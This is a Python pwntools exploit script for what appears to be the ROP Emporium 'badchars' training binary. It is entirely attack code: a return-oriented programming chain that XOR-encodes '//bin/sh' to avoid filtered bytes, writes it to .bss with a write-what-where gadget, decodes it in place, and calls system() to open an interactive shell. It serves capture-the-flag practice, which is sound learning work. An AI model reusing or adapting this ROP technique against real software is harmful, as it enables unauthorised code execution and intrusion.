#!/usr/bin/env python3

from pwn import *

pwn = process("./badchars")
gdb.attach(pwn, '''
break main
''')

############################### TOYS #################################
junk = b'A' * 40                                                     #
                                                                     #
call_system = p64(0x004009e8)                                        #
                                                                     #
pop_r12_r13 = p64(0x0000000000400b3b) # pop r12; pop r13; ret;       #
pop_r14_r15 = p64(0x0000000000400b40) # pop r14; pop r15; ret;       #
pop_rdi = p64(0x0000000000400b39) # pop rdi; ret;                    #
                                                                     #
target_addr = 0x601080                                               #
                                                                     #
# 0x0804a040 is the beginning of the .bss <--- Where                 #
where = p64(0x601080)                                                #
                                                                     #
# 2d 2d 60 6b 6c 2d 71 6a == //bin/sh XOR by 0x2 <--- What           #
what = b"\x2d\x2d\x60\x6b\x6c\x2d\x71\x6a"                           #
                                                                     #
www_gadget = p64(0x0000000000400b34) # mov qword ptr [r13], r12; ret;#
                                                                     #
xor_value = b"\x02\x00\x00\x00\x00\x00\x00\x00"                      #
xor_gadget = p64(0x0000000000400b30) # xor byte ptr [r15], r14b; ret;#
                                                                     #
ret = p64(0x00000000004006b1)                                        #
######################################################################

buf = junk
buf += pop_r12_r13
buf += what
buf += where
buf += www_gadget

counter = 0
while counter < 8:
	buf += pop_r14_r15
	buf += xor_value
	buf += p64(target_addr + counter)
	buf += xor_gadget
	counter += 1

buf += pop_rdi
buf += b"\x80\x10\x60\x00\x00\x00\x00\x00"
buf += ret # needed to not segfault
buf += call_system

pwn.sendline(buf)
pwn.interactive()
